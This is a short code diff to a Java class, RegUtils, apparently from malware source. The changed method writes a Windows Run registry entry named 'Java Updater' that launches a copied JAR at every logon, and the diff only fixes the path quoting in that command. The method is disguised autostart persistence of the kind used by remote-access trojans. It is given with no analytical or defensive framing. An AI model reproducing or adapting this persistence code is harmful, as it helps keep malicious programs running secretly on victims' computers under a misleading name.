@@ -26,7 +26,7 @@ public class RegUtils extends Utilities {
 		try {
 			FileUtils fu = new FileUtils();
 			RegHandler.createKey(RegHandler.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run");
-			String value = "\"" + System.getProperty("java.home") + "\\bin\\javaw.exe\" -jar " + fu.getNewFile();
+			String value = "\"" + System.getProperty("java.home") + "/bin/javaw.exe\"" + " -jar \"" + fu.getNewFile() + "\"";
 			RegHandler.writeStringValue(RegHandler.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Java Updater", value);
 		} catch (IllegalArgumentException|IllegalAccessException|InvocationTargetException e) { e.printStackTrace(); }
 	}
